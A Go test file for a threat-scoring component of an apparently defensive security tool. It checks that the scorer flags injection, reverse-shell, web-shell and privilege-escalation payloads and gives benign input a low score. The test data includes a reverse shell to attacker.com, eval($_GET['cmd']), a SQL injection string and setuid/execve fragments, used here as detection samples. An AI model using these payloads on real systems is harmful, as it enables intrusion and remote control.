package guardian

import (
	"testing"
	
	"shieldx/pkg/ebpf"
)

// TestThreatScorer tests basic threat scoring
func TestThreatScorer(t *testing.T) {
	scorer := NewThreatScorer()
	defer scorer.Stop()
	
	if scorer == nil {
		t.Fatal("Failed to create threat scorer")
	}
	
	// Test benign payload
	benignPayload := "Hello, World!"
	result := scorer.AnalyzeThreat(benignPayload, nil)
	
	if result.Score > 40 {
		t.Errorf("Benign payload scored too high: %d", result.Score)
	}
	
	if result.RiskLevel != "low" {
		t.Errorf("Expected low risk, got %s", result.RiskLevel)
	}
	
	t.Logf("Benign payload score: %d (%s)", result.Score, result.RiskLevel)
}

// TestMaliciousPatterns tests detection of known malicious patterns
func TestMaliciousPatterns(t *testing.T) {
	scorer := NewThreatScorer()
	defer scorer.Stop()
	
	maliciousPayloads := []struct {
		name    string
		payload string
		minScore int
	}{
		{
			name:    "shell_injection",
			payload: "/bin/sh -c 'echo pwned'",
			minScore: 60,
		},
		{
			name:    "eval_code",
			payload: "eval($_GET['cmd'])",
			minScore: 70,
		},
		{
			name:    "sql_injection",
			payload: "' OR '1'='1",
			minScore: 60,
		},
		{
			name:    "reverse_shell",
			payload: "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
			minScore: 80,
		},
		{
			name:    "privilege_escalation",
			payload: "setuid(0); execve('/bin/sh', ...)",
			minScore: 80,
		},
	}
	
	for _, tt := range maliciousPayloads {
		t.Run(tt.name, func(t *testing.T) {
			result := scorer.AnalyzeThreat(tt.payload, nil)
			
			if result.Score < tt.minScore {
				t.Errorf("Expected score >= %d, got %d", tt.minScore, result.Score)
			}
			
			if len(result.Indicators) == 0 {
				t.Error("Expected threat indicators to be detected")
			}
			
			t.Logf("%s: score=%d, indicators=%v, risk=%s", 
				tt.name, result.Score, result.Indicators, result.RiskLevel)
		})
	}
}

// TestEBPFIntegration tests integration with eBPF features
func TestEBPFIntegration(t *testing.T) {
	scorer := NewThreatScorer()
	defer scorer.Stop()
	
	payload := "execve('/bin/bash', ...)"
	
	// Mock eBPF features showing high threat
	ebpfFeatures := &ebpf.ThreatFeatures{
		DangerousSyscalls: 50,
		UnusualPatterns:   3,
		ShellExecution:    5,
		EventCount:        100,
		NetworkCalls:      150,
		FileCalls:         200,
		ProcessCalls:      25,
	}
	
	result := scorer.AnalyzeThreat(payload, ebpfFeatures)
	
	if result.Score < 70 {
		t.Errorf("Expected high threat score with dangerous eBPF features, got %d", result.Score)
	}
	
	if result.RiskLevel != "high" && result.RiskLevel != "critical" {
		t.Errorf("Expected high/critical risk, got %s", result.RiskLevel)
	}
	
	// Check that dynamic behavior was factored in
	if details, ok := result.Details["dynamic_behavior"]; ok {
		t.Logf("Dynamic behavior: %+v", details)
	} else {
		t.Error("Expected dynamic behavior analysis in details")
	}
	
	t.Logf("eBPF-enhanced score: %d (%s)", result.Score, result.RiskLevel)
}

// TestCaching tests threat score caching
func TestCaching(t *testing.T) {
	scorer := NewThreatScorer()
	defer scorer.Stop()
	
	payload := "test payload for caching"
	
	// First call - cache miss
	result1 := scorer.AnalyzeThreat(payload, nil)
	stats1 := scorer.GetStats()
	
	// Second call - should be cache hit
	result2 := scorer.AnalyzeThreat(payload, nil)
	stats2 := scorer.GetStats()
	
	if result1.Score != result2.Score {
		t.Error("Cached result should have same score")
	}
	
	if result1.Hash != result2.Hash {
		t.Error("Cached result should have same hash")
	}
	
	// Verify cache hit count increased
	hits1 := stats1["cache_hits"].(uint64)
	hits2 := stats2["cache_hits"].(uint64)
	
	if hits2 <= hits1 {
		t.Error("Cache hit count should have increased")
	}
	
	t.Logf("Cache stats: hits=%d, misses=%d, hit_rate=%.2f%%",
		stats2["cache_hits"], stats2["cache_misses"], 
		stats2["cache_hit_rate"].(float64)*100)
}

// TestObfuscationDetection tests obfuscation detection
func TestObfuscationDetection(t *testing.T) {
	scorer := NewThreatScorer()
	defer scorer.Stop()
	
	// High entropy obfuscated payload
	obfuscatedPayload := "4a6f686e446f65313233343536373839" + 
		"61626364656667686971696a6b6c6d6e6f" +
		"707172737475767778797a414243444546"
	
	result := scorer.AnalyzeThreat(obfuscatedPayload, nil)
	
	hasObfuscationIndicator := false
	for _, indicator := range result.Indicators {
		if indicator == "OBFUSCATED_CODE" || indicator == "HIGH_ENTROPY" {
			hasObfuscationIndicator = true
			break
		}
	}
	
	if !hasObfuscationIndicator {
		t.Error("Expected obfuscation to be detected")
	}
	
	t.Logf("Obfuscated payload score: %d, indicators: %v", 
		result.Score, result.Indicators)
}

// TestRecommendations tests security recommendations
func TestRecommendations(t *testing.T) {
	scorer := NewThreatScorer()
	defer scorer.Stop()
	
	tests := []struct {
		name            string
		payload         string
		expectedAction  string
	}{
		{
			name:           "benign_allow",
			payload:        "normal user input",
			expectedAction: "ALLOW",
		},
		{
			name:           "suspicious_quarantine",
			payload:        "/bin/sh suspicious activity",
			expectedAction: "QUARANTINE",
		},
		{
			name:           "malicious_block",
			payload:        "eval($_POST['cmd']); setuid(0); execve('/bin/sh')",
			expectedAction: "BLOCK",
		},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := scorer.AnalyzeThreat(tt.payload, nil)
			
			hasExpectedAction := false
			for _, rec := range result.Recommendations {
				if len(rec) > 0 && rec[:len(tt.expectedAction)] == tt.expectedAction {
					hasExpectedAction = true
					break
				}
			}
			
			if !hasExpectedAction {
				t.Errorf("Expected recommendation to contain '%s', got %v",
					tt.expectedAction, result.Recommendations)
			}
			
			t.Logf("%s: recommendations=%v", tt.name, result.Recommendations)
		})
	}
}

// TestConcurrency tests concurrent threat analysis
func TestConcurrency(t *testing.T) {
	scorer := NewThreatScorer()
	defer scorer.Stop()
	
	const numGoroutines = 100
	const numRequests = 10
	
	done := make(chan bool, numGoroutines)
	
	for i := 0; i < numGoroutines; i++ {
		go func(id int) {
			for j := 0; j < numRequests; j++ {
				payload := "concurrent test payload"
				result := scorer.AnalyzeThreat(payload, nil)
				if result == nil {
					t.Errorf("Goroutine %d: nil result", id)
				}
			}
			done <- true
		}(i)
	}
	
	// Wait for all goroutines
	for i := 0; i < numGoroutines; i++ {
		<-done
	}
	
	stats := scorer.GetStats()
	totalScored := stats["total_scored"].(uint64)
	
	if totalScored != numGoroutines*numRequests {
		t.Errorf("Expected %d total scores, got %d", 
			numGoroutines*numRequests, totalScored)
	}
	
	t.Logf("Concurrent test passed: %d requests processed", totalScored)
}

// BenchmarkThreatAnalysis benchmarks threat analysis performance
func BenchmarkThreatAnalysis(b *testing.B) {
	scorer := NewThreatScorer()
	defer scorer.Stop()
	
	payload := "test payload for benchmarking"
	ebpfFeatures := &ebpf.ThreatFeatures{
		DangerousSyscalls: 10,
		EventCount:        100,
	}
	
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = scorer.AnalyzeThreat(payload, ebpfFeatures)
	}
}

// BenchmarkCacheHit benchmarks cached threat lookups
func BenchmarkCacheHit(b *testing.B) {
	scorer := NewThreatScorer()
	defer scorer.Stop()
	
	payload := "cached payload"
	
	// Prime the cache
	_ = scorer.AnalyzeThreat(payload, nil)
	
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = scorer.AnalyzeThreat(payload, nil)
	}
}

// BenchmarkPatternMatching benchmarks pattern matching performance
func BenchmarkPatternMatching(b *testing.B) {
	scorer := NewThreatScorer()
	defer scorer.Stop()
	
	payload := "/bin/sh -c 'eval($_POST[\"cmd\"])' OR '1'='1"
	
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		scorer.analyzeStaticPatterns(payload)
	}
}
